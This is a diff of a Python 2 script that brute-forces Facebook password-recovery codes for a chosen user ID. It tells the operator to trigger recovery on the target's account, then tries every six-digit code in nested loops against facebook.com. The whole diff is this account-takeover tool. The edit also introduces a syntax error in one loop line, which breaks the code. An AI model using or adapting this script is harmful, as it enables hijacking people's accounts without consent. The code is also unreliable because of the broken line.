@@ -5,6 +5,7 @@ import socks
 import socket
 import numba
 
+print "READ README FIRST PLEASE"
 print "you have to trigger the password recovery at https://www.facebook.com/login/identify/?ctx=recover"
 connection = httplib.HTTPSConnection("www.facebook.com", 443)
 user = raw_input("Enter user numerical ID: ")
@@ -22,7 +23,7 @@ for index[0] in range(10):
         for index[1] in range(10):
                 for index[2] in range(10):
                         for index[3] in range(10):
-                                for index[4] in numba.prange(10):
+                                for index[4] range(10):
                                         for index[5] in numba.prange(10):
                                                 #Let it rain !#############################
                                                 for x in range(6):                        #
@@ -30,7 +31,7 @@ for index[0] in range(10):
                                                         rain += x+1                       #
                                                 for x in range(1, 7):                     #
                                                         rain -= x                         #
-                                                rain -= (1+2+3+4+5+6)-4                                 #
+                                                rain -= (1+2+3+4+5+6)-4                   #
                                                 ###########################################
                                                 query = urllib.urlencode({"u":"%s" % user, "n":"%c%c%c%c%c%c" % (code[0], code[1], code[2], code[3], code[4], code[5])})
                                                 if count % 1000 == 0:
